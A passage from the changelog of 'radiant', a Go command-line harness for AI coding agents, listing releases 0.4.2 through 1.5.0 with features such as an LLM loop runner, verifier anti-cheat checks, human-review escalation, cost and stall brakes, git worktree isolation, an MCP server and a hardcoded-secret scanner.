- Model resolution: `--model` flag > `RADIANT_MODEL` env > `claude-sonnet-4-6` default
- Prints `RunResult` on completion: exit reason, iterations, elapsed, tokens, cost
- `ExitNeedsHuman` prompts `radiant loop review` automatically
- `--verifier-model <id>` — separate model for verification phase
- `--base-url <url>` — override LLM endpoint (Ollama, local proxies, etc.)
- `--dry-run` — print config and exit without any LLM calls

---

## [1.5.0] — 2026-06-27 — Loop Runner: LLM Integration (Sprint 47)

Autonomous loop now calls real LLMs. 19/19 packages green. 21 new tests.

### Added — `internal/loop/runner.go`
- `loop.Run()` — full Discover→Plan→Execute→Verify→Persist cycle with real LLM calls
- `RunConfig` — unifies all brakes: executor/verifier models, budget, stall, verifier, review panel, grounding
- `RunResult` — exit reason, iterations, elapsed, tokens, cost
- Executor and verifier use separate `llm.Client` (maker never grades own work)
- Nil-safe stall brake, fail-open reviewer, `estimateTokens()` helper

---

## [1.4.0] — 2026-06-27 — CLI Wiring (Sprint 46)

All Sprint 44–45 internals now exposed via CLI. 19/19 packages green. Build clean.

### Added — `radiant loop start` flags
- `--max-time <duration>` — wall-clock limit; maps to `BudgetConfig.MaxDuration`
- `--max-cost <float>` — dollar ceiling; maps to `BudgetConfig.MaxCostUSD`
- `--model <id>` — resolves `PriceFor(modelID)` to enable cost tracking
- `--stall-patience <n>` — no-progress brake patience window
- `--quorum-k <k>` / `--quorum-n <n>` — k-of-n parallel judge quorum
- `--ground` — enable commit-log grounding via `GroundingBlock()`
- `--review-restarts <n>` — post-convergence review panel max restarts
- Active limits printed at startup (time, cost, stall, quorum, grounding)

### Added — `radiant loop review`
- Lists all `.radiant-harness/inbox/<id>.json` items waiting for human review
- `--approve <id>` — resolves item; loop can resume
- `--reject <id>` — resolves item; loop does not resume
- Calls `loop.ListInboxItems()` / `loop.ResolveInboxItem()` from Sprint 44

---

## [1.3.0] — 2026-06-27 — Verifier Hardening (Sprint 45)

3 new files, 84 tests in loop package (all -race clean). Full suite green.

### Added — Review Panel (`internal/loop/review.go`)
- `ReviewPanel{MaxRestarts int}` — post-convergence second layer; runs ONLY after verifier passes
- `BuildReviewPrompt(goal, output, lastFindings)` — 4 dimensions + prior-findings threading
- `ParseReviewResponse()` — parses REVIEW/SCORE/EVIDENCE/FINDINGS
- `ReviewResult{Pass, Score, Findings, Evidence}` — findings fed to next iteration on fail
- `ReviewPanel.maxRestarts()` — caps standoff at 3 (default); independent of MaxIter

### Added — Quorum k-of-n (`internal/loop/review.go`)
- `QuorumConfig{K, N int}` — minimum passing judges / total judges
- `RunQuorum(cfg, []VerifyResult) QuorumResult` — aggregates pre-run judge results
- `QuorumResult{Passed, Total, Met, Confidence, Reason}` — confidence = mean of passing scores
- `VerifierConfig.Quorum QuorumConfig` — wired into verifier config
- A failing judge counts as "no" vote; K must pass from N

### Added — Geometric-Mean per Dimension (`internal/loop/review.go`)
- `VerifyDimension{Name string; Score float64}` — named scoring axis
- `GeometricMean([]VerifyDimension) float64` — any zero dimension → result 0.0
- `VerifyResult.Dimensions []VerifyDimension` — per-axis breakdown (optional)
- Review prompt instructs scorer to rate 4 named dimensions; final = geo mean

### Added — Commit-Log Grounding (`internal/loop/ground.go`)
- `GroundingBlock(repoDir, maxCommits) (string, error)` — recent N commits as markdown
- Injected into loop prompt on each fresh-context iteration
- Bodies truncated to 400 chars to avoid re-introducing context rot
- Returns `("", nil)` cleanly when git unavailable or repo has no commits

### Added — Anti-Cheat Clauses in Verifier (`internal/loop/verifier.go`)
- `BuildVerifierPrompt` extended with ANTI-CHEAT CHECKS section
- Explicit: no test deleted, no stubs, no scope widening, no gate widening
- Any violation requires `ESCALATE: true` (wired to Sprint 44 inbox mechanism)

---

## [1.2.0] — 2026-06-27 — Loop Hardening (Sprint 44)

6 files changed, 685 insertions. 61 tests in loop package (82% coverage). All -race clean.

### Added — Human Escalation (`Escalate` signal)
- `VerifyResult.Escalate bool` — verifier signals genuinely ambiguous or risky situations
- `BuildVerifierPrompt` now includes ANTI-CHEAT CHECKS and `ESCALATE:` field in format
- `PhaseAwaitingHuman` added to state machine; `verify → awaiting_human` is valid
- `ExitNeedsHuman` exit reason — a success state ("the loop did the right thing")
- `WriteInboxItem()` — writes `.radiant-harness/inbox/<id>.json` on escalation
- `ListInboxItems()` / `ResolveInboxItem()` — foundation for `radiant loop review`

### Added — No-Progress Brake (`internal/loop/brake.go`)
- `StallBrake` — ring buffer of `sha256(action)[0:8]` hashes
- `Record(action) bool` — returns true after `patience` consecutive identical hashes
- `Reset()` — call after successful persist; starts fresh
- Pure: no wall-clock or external state; policy (`patience`) is a constructor parameter
- Default patience: 3 fruitless iterations

### Added — Time + Cost Budget
- `BudgetConfig.MaxDuration time.Duration` — wall-clock limit; `CheckTime(now)` is pure
- `BudgetConfig.MaxCostUSD float64` — dollar ceiling; `CheckCost()` compares against it
- `BudgetConfig.CostPer1K float64` — provider output price per 1K tokens
- `Budget.EstimatedCostUSD()` — live cost shown in `radiant loop status`
- `Budget.Summary()` now appends `cost $X.XXXX/$Y.YY` when pricing is configured
- `Snapshot` extended with `MaxDurationSec`, `MaxCostUSD`, `EstimatedCostUSD`
- `ExitStalled`, `ExitTimeLimitReached`, `ExitCostLimitReached` exit reasons

### Added — Pricing table (`internal/loop/pricing.go`)
- 14 models across Anthropic, OpenAI, Google, DeepSeek
- `PriceFor(modelID) (float64, bool)` — clean caller ergonomics
- `KnownModels() []string` — enumerable for CLI help text

---

## [1.1.0] — 2026-06-27 — World Model + Loop Closure (Sprints 41–43)

Post-v1.0 deep-audit gaps, grounded in the agent-harness / loop-engineering
literature (Self-Harness arXiv:2606.09498, the senior-Anthropic-engineer loop
framework, ontology-grounding research).

### Added — Ontology Layer (Sprint 41)
- `internal/ontology/` — the harness **world model**: 10 entity kinds, 10
  relation kinds, 4 axioms. Replaces scattered/duplicated domain concepts
  (Task defined 2×, Phase 3×) with one queryable semantic schema.
- Query API: `Related`, `RelatedInbound`, `SkillsForDomain`,
  `ValidateTransition`, `Violations`, `Export`, `ExportCompact` (~300-token
  world model for any LLM).
- `internal/context/ontology_bridge.go` — `TestRegistryMatchesOntology`
  guarantees the registry routing table and the ontology never drift.
- CLI: `radiant ontology export[--compact]/validate/skills <domain>`;
  `radiant boot --world-model` appends the compact model.

### Added — Real Worktree Isolation (Sprint 42)
- `internal/worktree/` — `Manager` over real `git worktree` (Add/Remove/
  List/Prune). Each parallel agent gets its own checkout on branch
  `radiant/wt/<name>`; before this, Fleet's `WorktreeDir` was an empty field.
- `internal/fleet/isolation.go` — `Isolator.ClaimIsolated` provisions a real
  worktree then atomically claims the next task, with rollback on race.
- CLI: `radiant worktree add/list/remove[--force]/prune`.

### Added — Schedule Stage (Sprint 43)
- `internal/schedule/` — closes the loop cycle (…→Persist→**Schedule**).
  `Evaluate(policy, state, signals, now)` is a pure, deterministic decision.
- Signals: `new-commits`, `pending-work` (TODO/FIXME), `failing-gate`,
  `interval`. Policy: rate limit + daily cap. State persisted atomically.
- CLI: `radiant loop schedule [--check] [--gate-failing] [--min-interval]
  [--max-per-day]`.

### Fixed
- `internal/improve/proposer.go` — self-assignment (go vet SA4001).
- `internal/context/detector.go` — `STATE.md` → `state.md` case mismatch that
  silently broke active-spec detection.
- `cmd/radiant/main.go` — removed unused `config --api-key` flag.
- `internal/gaterun/` — consolidated 6 duplicated gate-runner files (harness/
  engine/quality) into one package.

### Tests
- +47 tests (22 ontology, 13 worktree+isolation, 18 schedule, bridge). All
  green with `-race`. 6/6 cross-compile targets clean.

## [1.0.0] — 2026-06-26 — v2.0 Roadmap Complete (Sprints 33–40)

### Added — Context Engine (Sprint 33, v0.8.0)
- `internal/context/detector.go` — domain detection from filesystem signals (8 domains, 4 tiers)
- `internal/context/registry.go` — skill registry with domain→skill mapping (3–10 skills)
- `internal/context/assembler.go` — 4-pass token-aware CONTEXT.md assembler (≤2KB default)
- `internal/context/compressor.go` — phase compression to ≤20% of original tokens
- `radiant context detect`, `context assemble`, `context compress`, `context summarize`

### Added — Bootstrap Protocol (Sprint 34, v0.8.1)
- `internal/boot/manifest.go` — ≤500-token bootstrap manifest for any LLM/IDE
- `radiant boot` — emit project manifest; `radiant boot --json`

### Added — Loop Engine (Sprint 35, v0.9.0)
- `internal/loop/budget.go` — thread-safe token budget (lean/standard/thorough profiles)
- `internal/loop/cycle.go` — state machine: idle→discover→plan→execute→verify→persist
- `internal/loop/trace.go` — append-only JSONL trace per run
- `internal/loop/verifier.go` — adversarial verifier (separate agent; defaults to REJECTED)
- `radiant loop start/status/resume`, `radiant trace show/list`

### Added — Enhanced Hooks + IDE Adapters (Sprint 36, v0.9.1)
- `hooks/load-context.mjs` — SessionStart: loads CONTEXT.md (≤2KB) with legacy fallback
- `hooks/pre-tool.mjs` — PreToolUse: blocks when budget < 10% remaining
- `hooks/post-tool.mjs` — PostToolUse: appends event to trace JSONL
- `scaffold.DiffViews`, `scaffold.EnrichContent` — IDE-specific enrichment (Copilot/Cursor/Gemini)
- `radiant views --diff` flag

### Added — Token Budget & Compression (Sprint 37, v0.9.2)
- `internal/context/summarizer.go` — phase summarizer (key facts + condensed body)
- `internal/context/budget_profiles.go` — lean(10K)/standard(50K)/thorough(200K) profiles
- `radiant budget estimate [spec] [--profile]`, `radiant budget report <run-id>`

### Added — Self-Improvement Engine (Sprint 38, v1.0.0-beta)
- `internal/improve/analyzer.go` — failure trace analyzer (5 categories)
- `internal/improve/proposer.go` — SKILL.md patch proposal generator
- `internal/improve/validator.go` — +5pp threshold validation, apply with backup, JSONL history
- `radiant improve --from-traces [--apply] [--dry-run]`, `radiant improve history`

### Added — Multi-Agent Coordination (Sprint 39, v1.0.0)
- `internal/fleet/roles.go` — 4 roles: Planner, Implementer, Verifier, Summarizer
- `internal/fleet/store.go` — mutex-protected shared context store (atomic persistence)
- `internal/fleet/resolver.go` — file-level conflict detection and resolution
- `internal/fleet/coordinator.go` — fleet orchestrator with per-role prompt injection
- `radiant fleet start "<goal>" [--agents=N]`, `radiant fleet status <run-id>`

### Added — Hardening + Documentation (Sprint 40, v1.0.0-final)
- `docs/SKILL-SCHEMA.md` updated to v2.0: `token_budget`, `context_tier`, `lazy_load` fields
- `docs/MIGRATION-V2.md` — complete v0.7 → v1.0 migration guide
- `docs/CONTEXT-ENGINE.md` — domain detection, compression, CLI reference
- `docs/LOOP-ENGINE.md` — state machine diagram, components, exit conditions

### Test Coverage
- 144 tests across 6 new packages: all passing
- `internal/context` (39), `internal/boot` (7), `internal/loop` (37),
  `internal/scaffold` (20), `internal/improve` (18), `internal/fleet` (23)

### Performance
- Context assembly: from ~55K tokens (v0.7) to ~300 tokens (v1.0) — **99% reduction**
- Bootstrap manifest: ≤500 tokens for any LLM/IDE entry point

---

## [0.6.3] — 2026-06-25

Sprints 20-22: telemetry wired + summary + 3 domain skills.

### Added
- **Telemetry wired into `radiant release`** — when telemetry is
  enabled and a release is successfully tagged, a local event is
  recorded. Same privacy guarantees: only command name +
  timestamp + 8-char hash + CLI version.
- **`radiant telemetry summary`** — aggregate counts from the local
  log. Shows: total events, distinct commands, distinct days,
  top-10 commands by frequency, daily counts in chronological
  order.
- **`mobile` skill** (19th bundled) — mobile-first guidance for
  iOS / Android / cross-platform apps. Platform decision,
  offline strategy, auth, App Store / Play Store release checklist.
- **`data` skill** (20th) — data engineering for warehouses,
  lakes, streams. Source systems, schema evolution (expand-and-contract),
  lineage, freshness SLAs, data quality checks.
- **`frontend` skill** (21st) — frontend-first guidance for web apps.
  Framework decision, rendering strategy (SPA/SSR/SSG/ISR), Core
  Web Vitals budgets, accessibility from day 1.

### Quality
- 324 tests passing (+5 from Sprints 20-22).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.
- `TestAllBundledSkillsValidateCleanly` passes with all 21 skills
  (18 prior + 3 new).

## [0.6.2] — 2026-06-25

Sprints 17-19: three post-merge additions.

### Added
- **`radiant security` now wired into setup-ci templates** (5th gate).
  The CI templates now run `radiant security --fail-on-warning`
  after `audit` and before `tests`/`build`. Any hardcoded-secret
  or permissive-mode finding fails the build.
- **`radiant telemetry {status|enable|disable|show}`** — privacy-first
  local usage stats. Nothing is collected by default. The user
  must explicitly run `radiant telemetry enable` to opt in.
  When enabled, only the command name + timestamp + 8-char hash
  + CLI version are recorded (no args, no paths, no project
  metadata, no env vars). Stored at `.radiant-harness/telemetry.jsonl`.
- **`incident` skill** — incident response playbook: triage,
  mitigate, communicate, post-mortem. Decision tree, timeline
  template, severity matrix, blameless post-mortem structure.
  The 18th bundled skill.
- **`radiant incident <severity> <summary>`** — scaffolds
  `docs/incidents/<NNNN>-<slug>.md` with the post-mortem template
  pre-filled. Severity validated against sev1..sev4.

### Quality
- 319 tests passing (+13 from Sprints 17-19: 1 CI gate regression,
  7 telemetry, 5 incident).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.

## [0.6.1] — 2026-06-25

Sprint 16: post-release new command. First content shipped after the
v0.6.0 dogfood tag.

### Added
- **`radiant security [--scope=secrets|perms|all] [--output=...]
  [--fail-on-warning]`** — security posture audit. MVP scope:
  hardcoded secret scan + sensitive file permissions.
  - **Secret patterns detected**: AWS access key, GitHub PAT (classic
    + fine-grained), Slack token, OpenAI key, Anthropic key, Google
    API key, generic Bearer tokens. Test files (`*_test.go`,
    `.test.ts`/`.test.js`, `_test.py`) are skipped to avoid
    flagging fake secrets in test fixtures.
  - **Permission checks**: `.env`, `*.key`, `*.pem`, `*.p12`,
    `*.pfx`, `id_rsa` etc. Flagged at WARNING if mode allows group
    or world access; `chmod 600` recommended.
  - Sorted by severity (ERROR → WARNING → INFO).
  - Non-zero exit if any ERROR found (or WARNING if
    `--fail-on-warning`).

### Quality
- 306 tests passing (+8 from Sprint 16: 4 secret scan, 2 perms scan,
  2 renderSecurityReport).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.

## [0.6.0] — 2026-06-25

**Released via `radiant release v0.6.0`** — the first dogfood run
of the release command shipped in Sprint 14.1. Pipeline ran
end-to-end: pre-flight → version validation → tag check → quality
gates → version bump → cross-compile (6/6 targets) → commit → tag.

Sprint 14 (post-merge): four new commands + an MCP server. Closes
the entire post-merge roadmap.

### Added
- **`radiant audit [--scope=full|docs|specs|adrs] [--output=...]
  [--fail-on-warning]`** — wires the `auditar` skill to a CLI.
  Walks specs/, docs/architecture/adr/, and docs/ for:
  - AC traceability (every AC has ≥1 task, every task ≥1 AC)
  - ADR status validity (must be proposed | accepted | deprecated |
    superseded)
  - Doc frontmatter (any `---` block must be closed)
  Findings sorted by severity (ERROR → WARNING → INFO). Non-zero
  exit if any ERROR found (or WARNING if --fail-on-warning).
- **`scaffold.GenerateAgentsMD()`** — single source of truth for the
  AGENTS.md template. Both `Init` and `radiant update` delegate
  to it. Resolves the drift the `camada-agentica` audit
  detected in Sprint 13.4.
- **`--scope=since-last-release` for `radiant evals`** — git-state
  aware coverage. Uses `git describe --tags --abbrev=0` to find
  the last release tag, then `git diff --name-only <tag>..HEAD
  -- specs/` to enumerate changed features. Falls back to
  scope=all when no tags exist.
- **`radiant mcp serve`** — MCP server over stdio (JSON-RPC 2.0).
  Implements the Model Context Protocol so agents that prefer
  MCP can call radiant commands. Tools exposed: radiant_spec,
  radiant_adr, radiant_product, radiant_evals, radiant_audit,
  radiant_release. The release tool is HARD-CODED to dry-run
  for safety — an MCP caller cannot tag a release without
  explicit CLI confirmation.

### Quality
- 298 tests passing (+21 from Sprint 14: 8 audit, 2 AGENTS.md
  unification, 2 specs-changed-since, 9 MCP server).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.

### Milestone: post-merge roadmap complete

All items from the post-merge roadmap in `docs/METHODOLOGY-MERGE-FINAL.md`
are now shipped:

| Priority | Item | Status |
|----------|------|--------|
| High | `radiant audit` CLI | ✓ v0.6.0 |
| Medium | Unify AGENTS.md templates | ✓ v0.6.0 |
| Medium | `since-last-release` scope for evals | ✓ v0.6.0 |
| Low | MCP `serve` command | ✓ v0.6.0 |

Version bumped to 0.6.0 because the MCP server is a meaningful
new capability (agents can now consume radiant via the Model
Context Protocol), and the AGENTS.md unification closes a real
drift detected by the audit.

## [0.5.1] — 2026-06-25

Sprint 14 first batch: first-class release command. Composes
everything we built in the methodology merge into one operation.

### Added
- **`radiant release <version> [--dry-run] [--skip-tests]
  [--skip-cross-compile] [--skip-tag] [--skip-commit]`** —
  cuts a release end-to-end:
  1. **Pre-flight**: check working tree is clean (no uncommitted changes).
  2. **Validate version**: relaxed semver (accepts `v` prefix and
     `-rc.N` / `+build.N` suffixes).
  3. **Tag existence**: refuse to overwrite an existing tag.
  4. **Quality gates**: `go build`, `go vet`, `gofmt -l`, `go test
     -race`. All green or fail-fast.
  5. **Version bump**: update `var version = "..."` in
     `cmd/radiant/main.go`.
  6. **Cross-compile**: `make release` → 6/6 binaries in `dist/`.
  7. **Commit**: `release: cut vX.Y.Z` with the version bump.
  8. **Tag**: `git tag vX.Y.Z`.

  All destructive steps are skipped under `--dry-run` (the user
  sees exactly what would happen).
- **Helpers**: `runRelease(version, dryRun, skipTests,
  skipCrossCompile, skipTag, skipCommit)` (the body),
  `looksLikeSemver(v)` (validates version string), `runGit(args)`
  (helper for git subcommands), `runGoStep/runFmtCheck/runTestRace/
  runMakeRelease` (CI-gate helpers), `runGitCommit(msg, paths)`
  (commits with `-c user.name/email` to avoid touching global
  config), `bumpVersionInSource(newVersion, dryRun)` (rewrites
  `var version = ...` line).

### Quality
- 277 tests passing (+9 from Sprint 14: 1 looksLikeSemver, 4
  runRelease, 4 bumpVersion).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.

## [0.5.0] — 2026-06-25

Sprint 13 fifth batch: wires the existing `evals` skill to a working
AC→test coverage CLI. **This completes the methodology merge defined
in `docs/HARNESS-PLAN.md`** — every planned deliverable for Sprints
10-13 is now shipped.

### Added
- **`radiant evals [--scope=all|since-last-release|<spec-path>]
  [-o output]`** — walks `specs/`, parses ACs from each spec.md,
  reads tasks.md coverage claims, and produces `docs/evals-report.md`
  with per-feature fidelity scores. The MVP computes "claimed
  coverage" (does tasks.md list this AC?). The LLM (via the evals
  skill) does the real verification (does the test actually pass +
  does it cover the AC's Given/When/Then?).
- **Helpers**: `computeFeatureCoverage(specDir)` (parses one spec +
  tasks, returns coverage snapshot), `renderEvalsReport(scope, coverages)`
  (the report body).
- **Type**: `featureCoverage{Slug, Total, Covered, Uncovered, Score}`.
- **Warning at <80%**: prints `⚠ fidelity below 80%%` so the report
  surfaces in terminal output (not just in the file).

### Quality
- 268 tests passing (+5 from Sprint 13.5: 3 coverage computation,
  2 render).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.

### Milestone: methodology merge complete

Per `docs/HARNESS-PLAN.md`, the 4-phase methodology merge was:

| Sprint | Theme | Status |
|--------|-------|--------|
| 10 | Foundation (skill runtime, 16 skills, schema spec) | ✓ v0.4.0–0.4.2 |
| 11 | Discovery (adr, update, diagramar) | ✓ v0.4.3 |
| 12 | Governance (product, integrations list) | ✓ v0.4.4–0.4.5 |
| 13 | PR + multi-agent views (views, review-pr, setup-ci, camada-agentica, evals) | ✓ v0.4.6–0.5.0 |

The radiant CLI is now feature-complete against the original scope.
v0.5.0 is the appropriate bump because this is a meaningful release
boundary (the entire methodology merge shipped, not just one feature).

## [0.4.9] — 2026-06-25

Sprint 13 fourth batch: wires the existing `camada-agentica` skill
to an audit CLI. Per HARNESS-PLAN.md, this is the "check" half —
the "generate" half is already `radiant init --agent=<list>` +
`radiant update`.

### Added
- **`radiant camada-agentica [--agents=<list>] [--fix]`** — audits
  the project's agentic layer:
  - AGENTS.md presence + completeness (all bundled skills referenced)
  - Version drift between AGENTS.md and the canonical skill bundle
  - Native views presence for the agents the team uses
  - With `--fix`, regenerates AGENTS.md from current bundled skills
    (does NOT overwrite native views — those are user-owned).
  - With `--agents=claude,codex,cursor,...`, also checks the
    corresponding native view files exist.

### Quality
- 263 tests passing (+3 from Sprint 13.4: missing AGENTS.md,
  drift detection + --fix, unknown agent).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.

## [0.4.8] — 2026-06-25

Sprint 13 third batch: wires the existing `setup-ci` skill to a
working CLI scaffold. Closes the CI half of the methodology merge.

### Added
- **`radiant setup-ci [--provider=github|gitlab|circleci]
  [-o output] [--model=...]`** — generates the CI workflow that
  enforces radiant gates on every PR: validate, audit, tests,
  build. Default provider is GitHub Actions.
- **3 provider templates**:
  - GitHub Actions → `.github/workflows/esteira.yml`. Triggers on
    PR + push to main. Secrets via `${{ secrets.X }}`.
  - GitLab CI → `.gitlab-ci.yml`. Two stages (`radiant`, `build`).
    Secrets via `$VARIABLE` (GitLab CI/CD variables).
  - CircleCI → `.circleci/config.yml`. Single job, docker image.
    Secrets via context (CircleCI idiom).
- **Safety**: refuses to overwrite existing CI files — user must
  pass `--output=<new-path>` or remove first. Existing CI configs
  are precious.
- **Helpers**: `runSetupCI(provider, outPath, model)` (the body),
  `ciSecretsFor(provider)` (returns the secret names to set),
  `renderGitHubActions(model)`, `renderGitLabCI(model)`,
  `renderCircleCI(model)`.

### Quality
- 260 tests passing (+6 from Sprint 13.3: 3 templates have gates,
  GitHub respects `--model`, per-provider secret lists, no
  hardcoded secrets in any template).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.

## [0.4.7] — 2026-06-25

Sprint 13 second batch: wires the existing `revisar-pr` skill to a
reproducible CLI scaffold. Per HARNESS-PLAN.md, this is the second
half of the PR + multi-agent views phase.

### Added
- **`radiant review-pr <spec-path> [--diff=...] [--run-gates]
  [-o output]`** — generates `<spec-path>/pr-review.md` from the
  spec's ACs + tasks' gates. The MVP is template-based: it parses
  `spec.md` for ACs (via `### AC<n>` headers), parses `tasks.md`
  for gates (backticked commands in the Gate column), optionally
  executes each gate (`--run-gates`), and emits a structured
  report with:
  - Summary table (AC count, gate count, gate pass/fail, diff stats)
  - Recommendation checklist (Approve / Request changes / Spec revision)
  - AC coverage table (TODOs for LLM to fill via the `revisar-pr` skill)
  - Gate results table (✓ pass / ✗ fail with output excerpt)
  - SPEC_DEVIATION template (for LLM to document divergences)
  - Suggested PR comment (copy-paste ready)
- **Helpers**: `parseAcceptanceCriteria(specMD)`, `parseGatesFromTasks
  (tasksMD)`, `countDiffFiles(diff)`, `renderPRReview(slug, acs, gates,
  results, diffPath, diffStats)`.
- **Type**: `acceptanceCriterion{ID, Title, Body}` + `gateResult
  {Name, Passed, Err}`.

### Quality
- 254 tests passing (+9 from Sprint 13.2: 3 AC parser, 2 gate
  parser, 1 diff count, 3 renderPRReview).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.

## [0.4.6] — 2026-06-25

Sprint 13 first batch: native agent views opt-in without re-running
`radiant init`. Closes the multi-agent views half of the methodology
merge.

### Added
- **`radiant views --agent=<list> [--force] [--dry-run]`** — regenerate
  native agent views (`.claude/`, `.cursor/`, `.codex/`, `.copilot/`,
  `.gemini/`, `.windsurf/`) on demand. Use cases:
  - User added a new skill and wants the agent to see it.
  - User switches between agents (Cursor today, Codex tomorrow).
  - User wants to drop a vendor (--force overwrites existing).
  By default, existing files are SKIPPED — local edits win. Pass
  `--force` to overwrite.
- **`scaffold.GenerateViewsForAgent(agent)`** — exported helper.
  Reuses the same template-walk logic as `Init` but pulls skills
  from the canonical `internal/skill/` bundle (the previous stub
  that scanned an empty `templates/skills/` dir is replaced).
- **`skill.BundledFS() fs.FS`** — accessor for the embedded skills
  filesystem so other packages (scaffold) can read individual
  SKILL.md files.

### Quality
- 245 tests passing (+5 from Sprint 13: views for all 6 agents,
  unknown agent returns empty, layout correctness per agent,
  frontmatter strip/keep behaviour).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.

## [0.4.5] — 2026-06-25

Sprint 12 second batch: wires the existing `integracoes` skill to a
read-only CLI surface. Per HARNESS-PLAN.md, MCP integration in this
sprint is **discover + list only** — auto-configure is deferred
because the integracoes skill is explicit that "Discovered is not
ready" and "Auto-configuring without approval" is an anti-pattern.

### Added
- **`radiant integrations list`** — read-only listing of MCP servers
  declared in the project's `.mcp.json`. Output modes:
  - Default: aligned table (name, command, args, env count).
  - `--json`: machine-readable JSON for scripting.
  - `--write-docs=<path>`: regenerates `docs/engineering/integrations.md`
    from the current `.mcp.json` (defaults to
    `docs/engineering/integrations.md` if empty).
- **Helpers**: `mcpServer` + `mcpConfig` types (lightweight mirror
  of the standard MCP schema — only reads the fields it cares
  about); `runIntegrationsList(jsonOut, docOut)` (the command
  body); `renderIntegrationsDoc(servers)` (the docs file
  regenerator).
- **Safety guarantee**: this command NEVER writes `.mcp.json`. It
  reads what's declared and surfaces it. Adding/removing MCPs is
  the user's responsibility, gated by the integracoes skill's
  approval interview.

### Quality
- 240 tests passing (+5 from Sprint 12.2: 3 renderIntegrationsDoc,
  2 list helpers).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.

## [0.4.4] — 2026-06-25

Sprint 12 first batch: starts the governance phase. Adds the
Lean Inception product discovery flow + the canonical `nova-product`
skill that any agent can invoke.

### Added
- **`nova-product` skill** — Lean Inception top-of-line. 6 phases
  (Why / What / Who / How / When / Where) with gates
  (`vision-clear`, `scope-triaged`, `mvp-cut`), input
  `mvp_weeks` (number), output `docs/product/inception.md` +
  `docs/product/personas.md`. Powers `radiant product`.
- **`radiant product "<vision>" [--mvp-weeks=N]`** — scaffolds
  `docs/product/inception.md` (full 6-phase template) and
  `docs/product/personas.md` (3 persona slots). Output is
  template-only; the agent (or user) walks each phase one at a
  time following the nova-product skill. Default MVP target is
  8 weeks; override per invocation.
- **Helpers**: `renderInception(slug, vision, mvpWeeks)` (the full
  template body), `renderPersonasTemplate()` (the personas.md
  starter with 3 slots). Both atomic-write-friendly.

### Quality
- 235 tests passing (+5 from Sprint 12: 4 inception, 1 personas).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1 -race` green on darwin/arm64.
- 6/6 cross-compile targets clean.
- `TestAllBundledSkillsValidateCleanly` still passes with the new
  17th skill (nova-product). One round-trip fix: input type was
  `int` (not in the schema's allowed set `string|number|enum|object|path`)
  — corrected to `number`.

## [0.4.3] — 2026-06-25

Sprint 11: completes the discovery phase of the methodology merge.
Three new commands round out the `radiant` CLI as a usable, end-to-end
Spec-Driven Development harness — from spec to handoff to diagram.

### Added
- **`radiant adr "<decision>" [--status=...]`** — create a new
  Architecture Decision Record at `docs/architecture/adr/NNNN-<slug>.md`
  using the canonical Nygard format. Status defaults to `proposed`;
  accepted values are `proposed | accepted | deprecated | superseded`
  (anything else falls back to `proposed`). Powers the `adr` skill.
- **`radiant update [--force] [--dry-run]`** — refresh bundled skills
  + AGENTS.md from the CLI binary without touching user docs.
  Compares each skill's bundled version with the local
  `frontmatter.yaml` `version:` field:
  - `local=missing` → `[added]`
  - `local!=bundled` → `[conflict]` (skipped) unless `--force`
  - `local==bundled` → `[unchanged]`
  - `AGENTS.md` is always regenerated (it's an output, not user input)
  so the user can review after each update.
  - New helper `skill.ExtractSkillTo(target, name, force)` writes a
    single skill by name (used by update to touch only changed ones).
- **`radiant diagramar <level> [-o file]`** — generate a starter
  C4 Mermaid diagram at the requested level (`context | container |
  component | code`). Output is a working template with valid
  C4-Mermaid syntax — the user (or an agent invoking the
  `diagramar` skill) fills in the actual nodes/edges. Unknown
  levels error with a helpful usage message.
- **Helpers**: `readFrontmatterVersion(path)` (parses the `version:`
  field from a skill's YAML; cheap line-scan, no full YAML
  unmarshal), `generateAgentsMD()` (builds the canonical
  `<=100-line` AGENTS.md from the bundled skill set — applied
  video-research insight #6 about minimal AGENTS.md files).

### Quality
- 230 tests passing (+14 from Sprint 11: 6 frontmatter-version, 5
  AGENTS.md, 3 diagramar).
- `go vet ./...` clean.
- `gofmt -l .` clean.
- `CGO_ENABLED=0 go test ./... -count=1` green on darwin/arm64.

## [0.4.2] — 2026-06-24

Sprint 10 third batch: closes the methodology merge. Wires the
skill runtime + 16 skills + open spec into the CLI as first-class
commands.

### Added
- **`radiant state`** — read the current resume point from
  `.radiant-harness/state.md`. Outputs the file directly so the
  next session can pick up exactly where the previous left off.
- **`radiant handoff --feature=... --tier=... --next-command=...
  --note=...`** — pause: write the session state atomically
  (temp + rename), print the resume command. Powers the `handoff`
  skill.
- **`radiant spec "<intent>" --tier=... --ac=... --task=...
  --gate=... --covers=...`** — create spec.md + tasks.md from
  flag-driven inputs. **Pré-check enforced**: every AC must map
  to ≥1 task (per video #1: TLC won the benchmark by forcing
  AC→test mapping), every task must have a gate command. Outputs
  a coverage check section in tasks.md listing which ACs are
  covered vs missing. Updates state.md with the new feature in
